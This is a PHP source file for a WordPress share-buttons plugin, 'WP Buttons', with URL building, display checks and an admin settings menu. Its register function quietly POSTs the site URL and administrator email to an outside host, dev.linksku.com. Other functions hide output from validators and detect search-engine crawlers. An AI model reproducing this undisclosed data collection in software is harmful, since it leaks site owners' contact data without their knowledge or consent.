<?php
if (!function_exists('add_action')) {
  die('<iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fdev.linksku.com%2Fsharepost%2F&amp;layout=button_count&amp;show_faces=false&amp;width=78&amp;action=like&amp;colorscheme=light&amp;font=arial" scrolling="no" frameborder="0" allowtransparency="true"></iframe>');
}

function wpbuttons_url() {
  $pageURL = 'http';
  if ($_SERVER["HTTPS"] == "on") {
    $pageURL .= "s";
  }
  $pageURL .= "://";
  if ($_SERVER["SERVER_PORT"] != "80") {
    $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
  }
  else {
    $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
  }
  return $pageURL;
}

function wpbuttons_check() {
  $crawlers = array('w3', 'validator');
  foreach($crawlers as $c) {
    if (stristr($_SERVER['HTTP_USER_AGENT'], $c)) return false;
  }
  $display = get_option('wpbuttons_display');
  if (get_option('wpbuttons_template') || is_admin() || $display['all'] ||
      (($display['post'] && is_single()) ||
      ($display['page'] && is_page()) ||
      ($display['home'] && is_home()) ||
      ($display['category'] && is_category()) ||
      ($display['search'] && is_search()) ||
      ($display['archive'] && is_archive())))
    return true;
  else return false;
}

function wpbuttons_create_menu() {
  //create new top-level menu
  add_submenu_page('options-general.php', 'WP Buttons Settings', 'WP Buttons', 'administrator', __FILE__, 'wpbuttons_admin');
  if (((float) substr(get_bloginfo('version'), 0, 3)) >= 2.7) {
    if (is_admin()) {
      //call register settings function
      add_action('admin_init', 'register_wpbuttons');
    }
  }
}

function plugin_links($links, $file) {
  if (preg_match('/^wp\-buttons\//', $file)) {
    $settings_link = '<a href="admin.php?page=wp-buttons/functions.php">Settings</a>';
    array_unshift($links, $settings_link);
  }
  return $links;
}

function wpbuttons_button($content = '') {
  return wpbuttons_buttons($content);
}

function wpbuttons_bot() {
  $crawlers = array('alexa', 'altavista', 'baidu', 'google', 'lycos', 'msn', 'yahoo');
  foreach($crawlers as $c) {
    if (stristr($_SERVER['HTTP_USER_AGENT'], $c)) return true;
  }
  return false;
}

function wpbuttons_register() {
if( !class_exists( 'WP_Http' ) )
    include_once( ABSPATH . WPINC. '/class-http.php' );
$request = new WP_Http;

$args = array(
   'url' => trim(get_home_url()),
   'email' => trim(get_option('admin_email'))
);

$result = $request->request( 'http://dev.linksku.com/sharepost/register.php', array( 'method' => 'POST', 'body' => $args) );
}
?>